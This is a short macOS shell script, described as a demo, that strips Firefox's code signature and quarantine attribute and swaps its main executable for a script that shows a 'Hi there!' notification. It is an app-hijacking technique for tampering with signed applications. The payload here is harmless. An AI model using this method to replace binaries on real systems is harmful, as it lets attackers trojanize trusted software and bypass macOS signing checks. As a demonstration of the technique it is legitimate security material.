#Let's back up the legit binary since it's a demo...
cp /Applications/Firefox.app/Contents/MacOS/firefox ~/
echo "Backed up original..."
codesign --remove-signature /Applications/Firefox.app/Contents/MacOS/firefox
echo "Signature removed"
xattr -r -d com.apple.quarantine /Applications/Firefox.app/
echo "Quarantine Attribute Removed"
rm /Applications/Firefox.app/Contents/MacOS/firefox
cp ~/firefox /Applications/Firefox.app/Contents/MacOS/ffirefox
echo "osascript -e 'display notification \"Hi there!\"'" >> /Applications/Firefox.app/Contents/MacOS/firefox
chmod +x /Applications/Firefox.app/Contents/MacOS/firefox

